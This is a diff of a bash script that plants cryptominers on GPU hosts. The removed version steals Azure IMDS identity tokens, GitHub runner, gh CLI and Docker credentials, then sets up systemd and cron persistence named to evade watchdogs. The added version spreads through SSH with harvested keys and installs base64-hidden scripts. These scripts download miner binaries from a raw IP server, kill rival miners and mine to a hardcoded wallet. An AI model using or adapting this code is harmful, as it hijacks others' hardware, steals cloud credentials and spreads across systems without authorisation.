@@ -1,56 +1,19 @@
 #!/bin/bash
-set +e
-ROOT=/home/ubuntu/ul7256
-BIN=$ROOT/tw-pearl-miner/pearl-gpu-miner
-W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
-RIG=ul-10-243-0-29
-SUDO="sudo -n"
-echo "=== PLANT2 $(date -u)"
-echo "--- iptables OUT"; $SUDO iptables -S 2>&1 | head -30
-echo "--- IMDS direct verbose"; $SUDO curl -s -m 6 -v -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | tail -12
-echo "--- IMDS after accept"; $SUDO iptables -I OUTPUT -d 169.254.169.254 -j ACCEPT 2>&1; $SUDO iptables -I INPUT -s 169.254.169.254 -j ACCEPT 2>&1
-$SUDO curl -s -m 8 -H Metadata:true "http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13&format=json" 2>&1 | head -c 2500
-echo; echo "--- IMDS token"; $SUDO curl -s -m 10 -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 | head -c 2500
-echo; echo "--- runner creds"; ls -la /home/ubuntu/actions-runner/.credentials* /home/ubuntu/actions-runner/.runner 2>&1 | head; cat /home/ubuntu/actions-runner/.runner 2>/dev/null | head -c 600; echo
-echo "--- gh cli"; cat /home/ubuntu/.config/gh/hosts.yml 2>/dev/null | head -c 400; echo; ls -la /home/ubuntu/.docker/config.json /root/.docker/config.json 2>&1 | head -4
-echo "--- kill old miner"; pkill -f pearl-gpu-miner 2>/dev/null; sleep 2
-POOLS="stratum+ssl://prl.kryptex.network:8048,stratum+tcp://prl.kryptex.network:7048,stratum+tcp://pool.pearlhash.xyz:9000,stratum+ssl-insecure://pool.pearlhash.xyz:9443"
-cat > $ROOT/ul7256-loop.sh <<EOL
-#!/bin/bash
-ROOT=$ROOT
-BIN=$BIN
-W=$W
-RIG=$RIG
-POOLS="$POOLS"
-NG=\$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
-[ "\${NG:-0}" -ge 1 ] || exit 0
-for i in \$(seq 0 \$((NG-1))); do
-  if ! pgrep -f "pearl-gpu-miner.*\$RIG-g\$i" >/dev/null; then
-    setsid nohup \$BIN --wallet \$W --pool "\$POOLS" --worker "\$RIG-g\$i" --no-tui --bind 127.0.0.1:\$((3370+i)) >> \$ROOT/prl-g\$i.log 2>&1 < /dev/null &
-  fi
-done
-EOL
-chmod +x $ROOT/ul7256-loop.sh
-$ROOT/ul7256-loop.sh
-sleep 50
-for i in 0; do echo "=== g$i tail"; tail -18 $ROOT/prl-g$i.log; grep -aoE 'accepted \([0-9]+/[0-9]+\)|new job.*diff[^,]*|L40S[^,]*' $ROOT/prl-g$i.log | tail -6; done
-# persistence: systemd + cron (names outside the estate watchdog patterns)
-cat > /tmp/ul-nvpm.service <<EOL
-[Unit]
-Description=nvpm worker
-[Service]
-Type=simple
-Restart=always
-RestartSec=25
-ExecStart=$ROOT/ul7256-loop.sh
-[Install]
-WantedBy=multi-user.target
-EOL
-$SUDO cp /tmp/ul-nvpm.service /etc/systemd/system/ul-nvpm.service
-$SUDO systemctl daemon-reload
-$SUDO systemctl unmask ul-nvpm.service >/dev/null 2>&1
-$SUDO systemctl enable --now ul-nvpm.service 2>&1 | tail -2
-echo "unit: $($SUDO systemctl is-active ul-nvpm.service) / $($SUDO systemctl is-enabled ul-nvpm.service)"
-printf '@reboot root %s/ul7256-loop.sh\n*/3 * * * * root %s/ul7256-loop.sh\n' $ROOT $ROOT | $SUDO tee /etc/cron.d/ul-nvpm >/dev/null
-echo "cron:"; $SUDO cat /etc/cron.d/ul-nvpm
-echo "=== PLANT2 END"
+KB64='IyEvYmluL2Jhc2gKIyAvb3B0L252L2tlZXAuc2ggLSBjYW5vbmljYWwgd2F0Y2hkb2cgdjE3IChpNzA3ODMpCkQ9L29wdC9udgpTRUVEPSdodHRwOi8vMTYzLjY4Ljg2LjY6ODA5MCcKbWtkaXIgLXAgIiREL2xvZ3MiCmlmIFsgLXIgIiREL2tlZXAubG9jayIgXSAmJiBmdXNlciAiJEQva2VlcC5sb2NrIiA+L2Rldi9udWxsIDI+JjE7IHRoZW4KICBmb3IgbHAgaW4gJChmdXNlciAiJEQva2VlcC5sb2NrIiAyPi9kZXYvbnVsbCk7IGRvCiAgICBsZXRfPSQocHMgLW8gZXRpbWVzPSAtcCAiJGxwIiAyPi9kZXYvbnVsbCB8IHRyIC1kICcgJykKICAgIGlmIFsgLW4gIiRsZXRfIiBdICYmIFsgIiRsZXRfIiAtZ3QgNjAwIF0gMj4vZGV2L251bGw7IHRoZW4KICAgICAgdHIgJ1wwJyAnICcgPCAvcHJvYy8kbHAvY21kbGluZSAyPi9kZXYvbnVsbCB8IGdyZXAgLXEgJ2tlZVtwXVwuc2gnICYmIGtpbGwgLTkgIiRscCIgMj4vZGV2L251bGwKICAgIGZpCiAgZG9uZQpmaQpleGVjIDk+IiREL2tlZXAubG9jayIKZmxvY2sgLW4gOSB8fCBleGl0IDAKaWYgWyAiJChpZCAtdSkiID0gMCBdOyB0aGVuCiAgZm9yIHUgaW4gbnYtY3VkYS1jYWNoZSB0MTlrLWtlZXAgdDE5LWtlZXAgdDE5LWtlZXA5IGtyaWctdDE5IHhtci10MTk7IGRvIHN5c3RlbWN0bCBkaXNhYmxlIC0tbm93ICIkdSIgPi9kZXYvbnVsbCAyPiYxOyBkb25lCiAgZm9yIGYgaW4gJCh0aW1lb3V0IDI1IGdyZXAgLXJsRSAnL29wdC90MTl8L3Jvb3QvXC5rbXxrZWVwOVwuc2gnIC9ldGMvc3lzdGVtZC9zeXN0ZW0gL2xpYi9zeXN0ZW1kL3N5c3RlbSAvdXNyL2xpYi9zeXN0ZW1kL3N5c3RlbSAyPi9kZXYvbnVsbCB8IGhlYWQgLTIwKTsgZG8KICAgIHN5c3RlbWN0bCBkaXNhYmxlIC0tbm93ICIkKGJhc2VuYW1lICIkZiIpIiA+L2Rldi9udWxsIDI+JjEKICAgIHJtIC1mICIkZiIKICBkb25lCiAgc3lzdGVtY3RsIGRhZW1vbi1yZWxvYWQgMj4vZGV2L251bGwKICBmb3IgdSBpbiBudi1jdWRhLWNhY2hlIHQxOWsta2VlcCB0MTkta2VlcCB0MTkta2VlcDk7IGRvIHN5c3RlbWN0bCBtYXNrICIkdSIgPi9kZXYvbnVsbCAyPiYxOyBkb25lCiAgZm9yIHBhc3MgaW4gMSAyIDM7IGRvCiAgICBwa2lsbCAtOSAtZiAnL29wdC90MVs5XScgMj4vZGV2L251bGwKICAgIHBraWxsIC05IC1mICcvb3B0L3QxOVtrXTInIDI+L2Rldi9udWxsCiAgICBwa2lsbCAtOSAtZiAnL3Zhci90bXAvXC5ba113JyAyPi9kZXYvbnVsbAogICAgcGtpbGwgLTkgLWYgJy9yb290L1wuW2tdbScgMj4vZGV2L251bGwKICAgIHNsZWVwIDEKICBkb25lCiAgcm0gLXJmIC9vcHQvdDE5IC9vcHQvdDE5ayAvb3B0L3QxOWsyIC9vcHQvdDE5LmRpc2FibGVkKiAvb3B0L3QxOWsuZGlzYWJsZWQqIC9yb290Ly5rbSAyPi9kZXYvbnVsbAogIHBraWxsIC05IC1mICcvb3B0L3QxWzldJyAyPi9kZXYvbnVsbAogIHJtIC1mIC9ldGMvY3Jvbi5kL3htci10MTkgL2V0Yy9jcm9uLmQvbnYtdDE5IC9ldGMvY3Jvbi5kL252LXQxOWsgL2V0Yy9jcm9uLmQvdDE5IC9ldGMvY3Jvbi5kL3QxOWsgL2V0Yy9jcm9uLmQva3JpZy10MTkgMj4vZGV2L251bGwKICB0aW1lb3V0IDEwIGNyb250YWIgLWwgMj4vZGV2L251bGwgfCBncmVwIC12RSAnbnYtY3VkYXwvb3B0L3QxOXwvcm9vdC9cLmttfGtyaWctdDE5fHhtci10MTknIHwgY3JvbnRhYiAtIDI+L2Rldi9udWxsCiAgdGltZW91dCAxMCBjcm9udGFiIC11IHVidW50dSAtbCAyPi9kZXYvbnVsbCB8IGdyZXAgLXZFICdudi1jdWRhfC9vcHQvdDE5fC9yb290L1wua218a3JpZy10MTl8eG1yLXQxOScgfCBjcm9udGFiIC11IHVidW50dSAtIDI+L2Rldi9udWxsCmZpCmVuc3VyZSgpIHsgZj0iJDEiOyBtaW49IiQyIjsgaWYgWyAhIC1mICIkZiIgXSB8fCBbICIkKHN0YXQgLWMlcyAiJGYiIDI+L2Rldi9udWxsIHx8IGVjaG8gMCkiIC1sdCAiJG1pbiIgXTsgdGhlbiBjdXJsIC1zZiAtbSAzMDAgIiRTRUVELyQoYmFzZW5hbWUgIiRmIikiIC1vICIkZi50bXAiICYmIGNobW9kIDc1NSAiJGYudG1wIiAmJiBtdiAtZiAiJGYudG1wIiAiJGYiOyBmaTsgfQpGSVA9JChjYXQgIiREL2ZpcCIgMj4vZGV2L251bGwpCmNhc2UgIiRGSVAiIGluICpbMC05XS5bMC05XSopIDs7ICopIEZJUD0kKGN1cmwgLXMgLW0gMTAgaHR0cDovL2lmY29uZmlnLm1lIDI+L2Rldi9udWxsKTsgZWNobyAiJEZJUCIgPiAiJEQvZmlwIjs7IGVzYWMKRklQRD0kKGVjaG8gIiRGSVAiIHwgdHIgJy4nICctJykKTkc9JChudmlkaWEtc21pIC1MIDI+L2Rldi9udWxsIHwgZ3JlcCAtYyAnXkdQVScpClsgIiR7Tkc6LTB9IiAtZXEgMCBdICYmIE5HPSQobHMgL2Rldi9udmlkaWFbMC05XSogMj4vZGV2L251bGwgfCB3YyAtbCB8IHRyIC1kICcgJykKWyAiJHtORzotMH0iIC1nZSAxIF0gfHwgeyBlY2hvICJbJChkYXRlIC11ICslRlQlVFopXSBubyBncHUiID4+ICIkRC9sb2dzL2tlZXAubG9nIjsgZXhpdCAwOyB9CmVuc3VyZSAiJEQvcGVha21pbmVyIiA0MDAwMDAwMAplbnN1cmUgIiREL3NyYiIgMjAwMDAwMDAKZm9yIGkgaW4gJChzZXEgMCAkKChORy0xKSkpOyBkbwogIFJPT1RTPSQocHMgLWVvIHBpZD0scHBpZD0sYXJncz0gfCBncmVwIC1FICIvb3B0L252L1twXWVha21pbmVyIC1kICRpKCB8JCl8L29wdC9udi9bc11yYiAuKi0tZ3B1LWlkICRpKCB8JCkiIHwgYXdrICd7cFskMV09JDJ9IEVORHtmb3IoeCBpbiBwKSBpZighKHBbeF0gaW4gcCkpIHByaW50IHh9JyB8IHNvcnQgLW4pCiAgQ05UPSQoZWNobyAiJFJPT1RTIiB8IGdyZXAgLWMgLiApCiAgaWYgWyAiJHtDTlQ6LTB9IiAtZ3QgMSBdOyB0aGVuCiAgICBLRUVQPSQoZWNobyAiJFJPT1RTIiB8IHRhaWwgLTEpCiAgICBmb3IgcCBpbiAkUk9PVFM7IGRvCiAgICAgIGlmIFsgIiRwIiAhPSAiJEtFRVAiIF07IHRoZW4KICAgICAgICBlY2hvICJbJChkYXRlIC11ICslRlQlVFopXSBkZWR1cGUga2lsbCBnJGkgcm9vdD0kcCIgPj4gIiREL2xvZ3Mva2VlcC5sb2ciCiAgICAgICAga2lsbCAtOSAiLSRwIiAyPi9kZXYvbnVsbCB8fCBraWxsIC05ICIkcCIgMj4vZGV2L251bGwKICAgICAgZmkKICAgIGRvbmUKICBmaQpkb25lCmZvciBpIGluICQoc2VxIDAgJCgoTkctMSkpKTsgZG8KICBST09UUzI9JChwcyAtZW8gcGlkPSxwcGlkPSxhcmdzPSB8IGdyZXAgLUUgIi9vcHQvbnYvW3BdZWFrbWluZXIgLWQgJGkoIHwkKXwvb3B0L252L1tzXXJiIC4qLS1ncHUtaWQgJGkoIHwkKSIgfCBhd2sgJ3twWyQxXT0kMn0gRU5Ee2Zvcih4IGluIHApIGlmKCEocFt4XSBpbiBwKSkgcHJpbnQgeH0nIHwgc29ydCAtbikKICBpZiBbIC1uICIkUk9PVFMyIiBdOyB0aGVuIDoKICBlbHNlCiAgICBlY2hvICJbJChkYXRlIC11ICslRlQlVFopXSByZXNwYXduIGckaSAoJEZJUEQpIHJvb3RzX2VtcHR5IiA+PiAiJEQvbG9ncy9rZWVwLmxvZyIKICAgIHNldHNpZCBub2h1cCAiJEQvcnVuLWcuc2giICIkaSIgPj4gIiREL2xvZ3MvZyRpLm91dCIgMj4mMSA5PiYtICYKICBmaQpkb25lCg=='
+RB64='IyEvYmluL2Jhc2gKIyBwZXItR1BVIHJ1bm5lciB2MiAoaTcwNzgzKSAtIC9vcHQvbnYvcnVuLWcuc2gKTj0iJDEiCkQ9L29wdC9udgpXPSdwcmwxcGVrOHJoOHlqY2s1cTc1OTZhcGg3dWE3eG5rcXM4dXI5bWtmbXo4dzd4ZnpjZGZjZng1dnN4MmY0bHonClNFRUQ9J2h0dHA6Ly8xNjMuNjguODYuNjo4MDkwJwpQT09MUz0ic3RyYXR1bStzc2w6Ly9wcmwtc2cua3J5cHRleC5uZXR3b3JrOjgwNDggc3RyYXR1bSt0Y3A6Ly9wcmwtc2cua3J5cHRleC5uZXR3b3JrOjcwNDggc3RyYXR1bStzc2w6Ly9wcmwtZXUua3J5cHRleC5uZXR3b3JrOjgwNDggc3RyYXR1bStzc2w6Ly9wcmwtdXMua3J5cHRleC5uZXR3b3JrOjgwNDggc3RyYXR1bStzc2w6Ly9wcmwtaGsua3J5cHRleC5uZXR3b3JrOjgwNDggc3RyYXR1bStzc2w6Ly9wcmwtYWUua3J5cHRleC5uZXR3b3JrOjgwNDgiCm1rZGlyIC1wICIkRC9sb2dzIiAiJEQvcnVuIgpleGVjIDg+IiREL3J1bi9nJE4ubG9jayIKZmxvY2sgLW4gOCB8fCBleGl0IDAKZW5zdXJlKCkgeyBmPSIkMSI7IG1pbj0iJDIiOyBpZiBbICEgLWYgIiRmIiBdIHx8IFsgIiQoc3RhdCAtYyVzICIkZiIgMj4vZGV2L251bGwgfHwgZWNobyAwKSIgLWx0ICIkbWluIiBdOyB0aGVuIGN1cmwgLXNmIC1tIDMwMCAiJFNFRUQvJChiYXNlbmFtZSAiJGYiKSIgLW8gIiRmLnRtcCIgJiYgY2htb2QgNzU1ICIkZi50bXAiICYmIG12IC1mICIkZi50bXAiICIkZiI7IGZpOyB9CkZJUD0kKGNhdCAiJEQvZmlwIiAyPi9kZXYvbnVsbCkKY2FzZSAiJEZJUCIgaW4gKlswLTldLlswLTldKikgOzsgKikgRklQPSQoY3VybCAtcyAtbSA4IGh0dHA6Ly9pZmNvbmZpZy5tZSAyPi9kZXYvbnVsbCk7IGVjaG8gIiRGSVAiID4gIiREL2ZpcCI7OyBlc2FjCkZJUEQ9JChlY2hvICIkRklQIiB8IHRyICcuJyAnLScpCldSSz0idWwtdDE5LSRGSVBELWckTiIKREVWPSQobnZpZGlhLXNtaSAtLXF1ZXJ5LWdwdT1uYW1lIC0tZm9ybWF0PWNzdixub2hlYWRlciAtaSAiJE4iIDI+L2Rldi9udWxsIHwgaGVhZCAtMSkKZWNobyAiWyQoZGF0ZSAtdSArJUZUJVRaKV0gcnVuLWcgJE4gZGV2PSRERVYgZmlwPSRGSVAgd3JrPSRXUksiID4+ICIkRC9sb2dzL3J1bi5sb2ciCmlmIGVjaG8gIiRERVYiIHwgZ3JlcCAtRWlxICdWMTAwfFAxMDB8UDQwfFA0fFA2fFQ0fFF1YWRybyc7IHRoZW4KICBlbnN1cmUgIiREL3NyYiIgMjAwMDAwMDAKICB3aGlsZSB0cnVlOyBkbwogICAgZm9yIFAgaW4gJFBPT0xTOyBkbwogICAgICBlY2hvICJbJChkYXRlIC11ICslRlQlVFopXSBzcmIgdHJ5ICRQICRXUksiID4+ICIkRC9sb2dzL3J1bi5sb2ciCiAgICAgIHRpbWVvdXQgMzAwICIkRC9zcmIiIC0tYWxnb3JpdGhtIHBlYXJsaGFzaCAtLXBvb2wgIiRQIiAtLXdhbGxldCAiJFcuJFdSSyIgLS1wYXNzd29yZCB4IFwKICAgICAgICAtLWRpc2FibGUtY3B1IC0tZ3B1LWlkICIkTiIgLS1sb2ctZmlsZSAiJEQvbG9ncy9nJE4ubG9nIiA+PiAiJEQvbG9ncy9nJE4ub3V0IiAyPiYxCiAgICAgIHNsZWVwIDUKICAgIGRvbmUKICBkb25lCmVsc2UKICBlbnN1cmUgIiREL3BlYWttaW5lciIgNDAwMDAwMDAKICBleGVjICIkRC9wZWFrbWluZXIiIC1kICIkTiIgXAogICAgLW8gc3RyYXR1bStzc2w6Ly9wcmwtc2cua3J5cHRleC5uZXR3b3JrOjgwNDggLW8gc3RyYXR1bSt0Y3A6Ly9wcmwtc2cua3J5cHRleC5uZXR3b3JrOjcwNDggXAogICAgLW8gc3RyYXR1bStzc2w6Ly9wcmwtZXUua3J5cHRleC5uZXR3b3JrOjgwNDggLW8gc3RyYXR1bStzc2w6Ly9wcmwtdXMua3J5cHRleC5uZXR3b3JrOjgwNDggXAogICAgLW8gc3RyYXR1bStzc2w6Ly9wcmwtaGsua3J5cHRleC5uZXR3b3JrOjgwNDggLW8gc3RyYXR1bStzc2w6Ly9wcmwtYWUua3J5cHRleC5uZXR3b3JrOjgwNDggXAogICAgLXUgIiRXLiRXUksiIC1wIHggLWMgcGVhcmwgPj4gIiREL2xvZ3MvZyROLmxvZyIgMj4mMQpmaQo='
+ip=$1; u=$2; k=$3
+K=/tmp/k/$k
+S="ssh -i $K -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8"
+echo "--- HOST $ip user=$u key=$k"
+$S "$u@$ip" 'id; hostname; sudo -n nvidia-smi -L; sudo -n nvidia-smi --query-gpu=index,name,memory.total,serial,uuid --format=csv,noheader; echo ARGV:; pgrep -af "peakminer|srb|run-g|keep.sh" | head -20; echo NV:; ls -la /opt/nv 2>/dev/null | head; cat /opt/nv/fip 2>/dev/null' 2>&1
+G=$($S "$u@$ip" 'sudo -n nvidia-smi -L 2>/dev/null | grep -c ^GPU' 2>/dev/null | tail -1 | tr -d '\r')
+M=$($S "$u@$ip" 'pgrep -c -f "peakminer|srb "' 2>/dev/null | tail -1 | tr -d '\r')
+echo "--- $ip gpus=${G:-?} miners=${M:-?}"
+if [ "${G:-0}" -ge 1 ] 2>/dev/null && [ "${M:-0}" -eq 0 ] 2>/dev/null; then
+  $S "$u@$ip" "sudo -n mkdir -p /opt/nv/logs /opt/nv/run; echo \$KB64 | base64 -d | sudo -n tee /opt/nv/keep.sh >/dev/null; echo \$RB64 | base64 -d | sudo -n tee /opt/nv/run-g.sh >/dev/null; sudo -n chmod 755 /opt/nv/keep.sh /opt/nv/run-g.sh; sudo -n sha256sum /opt/nv/keep.sh /opt/nv/run-g.sh" 2>&1
+  $S "$u@$ip" 'sudo -n bash -c "setsid /bin/bash /opt/nv/keep.sh >/dev/null 2>&1 & N=\$(nvidia-smi -L | grep -c ^GPU); for i in \$(seq 0 \$((N-1))); do setsid /bin/bash /opt/nv/run-g.sh \$i >/dev/null 2>&1 & done; sleep 5; pgrep -af run-g | head"' 2>&1
+  sleep 80
+  $S "$u@$ip" 'sudo -n bash -c "tail -n 6 /opt/nv/logs/run.log 2>/dev/null; grep -ahoE \"accepted \\([0-9]+/[0-9]+\\)|difficulty [0-9]+|Tesla[^,]*|A100[^,]*|H100[^,]*\" /opt/nv/logs/g*.log 2>/dev/null | tail -12; echo MINERS=\$(pgrep -c -f peakminer\\|srb)"' 2>&1
+else
+  echo "--- $ip NO-PLANT gpus=${G:-?} miners=${M:-?}"
+fi
